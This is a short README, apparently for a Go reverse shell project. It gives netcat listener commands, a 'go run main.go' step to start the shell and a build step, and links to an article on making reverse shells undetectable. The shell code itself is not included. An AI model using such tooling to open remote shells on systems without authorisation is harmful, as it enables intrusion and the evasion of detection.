# Golang Reverse Shell

```bash
# start local server
nc -lvp 1337
nc -l 1337

# start reverse shell
go run main.go

# build binary
go generate
```

## References

- [Undetectable Reverse shell with golang](https://medium.com/@sathish__kumar/undetectable-reverse-shell-with-golang-4fd4b1e172c1)
- [yougg/reversecmd.go](https://gist.github.com/yougg/b47f4910767a74fcfe1077d21568070e)
